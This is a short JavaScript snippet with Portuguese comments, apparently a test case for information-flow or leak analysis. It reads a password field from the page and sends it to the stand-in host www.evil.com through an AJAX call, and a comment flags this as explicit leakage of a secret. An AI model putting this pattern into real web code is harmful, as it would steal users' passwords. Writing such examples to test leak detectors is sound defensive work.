var revelaH = function(h) {
	// O valor do parâmetro <h>, tido como confidencial, é explicitamente
	// propagado para o domínio www.evil.com:
	makeAjaxCall('www.evil.com/tell/secret/' + h);
}

var h = document.getElementById('password').value;
revelaH(h);